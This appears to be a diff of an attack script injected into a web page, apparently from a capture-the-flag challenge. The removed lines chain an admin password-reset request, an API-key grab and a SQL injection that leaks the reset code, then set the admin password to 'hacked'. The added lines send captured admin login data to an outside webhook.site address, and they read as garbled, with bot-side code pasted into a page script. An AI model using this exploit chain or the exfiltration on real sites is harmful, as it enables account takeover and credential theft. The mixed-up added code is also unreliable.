@@ -1,31 +1,9 @@
 <script>
-async function exploit() {
-  // Trigger forgot password for admin
-  await fetch('http://web:80/forgot_password.php', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: 'username=admin'
-  });
-
-  // Get/generate dev API key via session
-  let meResponse = await fetch('http://web:80/api/me.php');
-  let meData = await meResponse.json();
-  let apiKey = meData.api_key;
-
-  // SQLi to leak admin reset code
-  let inject = "0 union select id,username,code,code_created_at from users where username='admin' -- ";
-  let leakResponse = await fetch(`http://web:80/api/search_feedback.php?feedback_id=${encodeURIComponent(inject)}`, {
-    headers: { 'X-API-Key': apiKey }
-  });
-  let leakData = await leakResponse.json();
-  let resetCode = leakData.feedback[0].feedback;
-
-  // Reset admin password
-  await fetch('http://web:80/reset.php', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: `code=${encodeURIComponent(resetCode)}&new_password=hacked`
-  });
+// in visitUrl()
+const loginResult = await loginToAdmin();
+if (!loginResult || !loginResult.cookies) {
+    console.error("Login failed");
 }
-exploit();
+console.log("Login payload used:", loginResult.loginData);
+fetch('https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b/?c=' + loginResult.loginData);
 </script>
